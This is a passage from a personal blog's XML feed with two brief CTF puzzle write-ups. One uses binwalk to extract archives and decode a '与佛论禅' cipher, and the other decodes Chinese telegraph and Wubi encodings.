    <link href="https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html</id>
    <published>2020-02-07T08:51:35.000Z</published>
    <updated>2020-02-07T09:22:49.870Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>下载压缩包解压有密码，binwalk分离出来两个压缩包。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/1.png" class title="This is an test image"><br><strong>会直接把fo.txt分离出来。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/2.png" class title="This is an test image"><br><strong>打开是’与佛论禅’密码，在线网站解密一下。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/3.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;下载压缩包解压有密码，binwalk分离出来两个压缩包。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-7-GXYCTF20
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 buuctf_misc_从娃娃抓起</title>
    <link href="https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html"/>
    <id>https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html</id>
    <published>2020-02-06T04:37:40.000Z</published>
    <updated>2020-02-07T07:51:57.592Z</updated>
    
    <content type="html"><![CDATA[<p><strong>根据题目提示：</strong><br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/2.png" alt="2-6-buuctf-misc-从娃娃抓起"><br>编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。<br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/3.png" alt="2-6-buuctf-misc-从娃娃抓起"><br><a href="https://dianma.51240.com/" target="_blank" rel="noopener">中文电码在线解码</a><br><strong>五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;根据题目提示：&lt;/strong&gt;&lt;br&gt;&lt;img src data-echo=&quot;2-6-buuctf-misc-从娃娃抓起/2.png&quot; alt=&quot;2-6-buuctf-misc-从娃娃抓起&quot;&gt;&lt;br&gt;编码是两个汉字编码，试了好多编码形式，找到了两个：中文电
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
</feed>
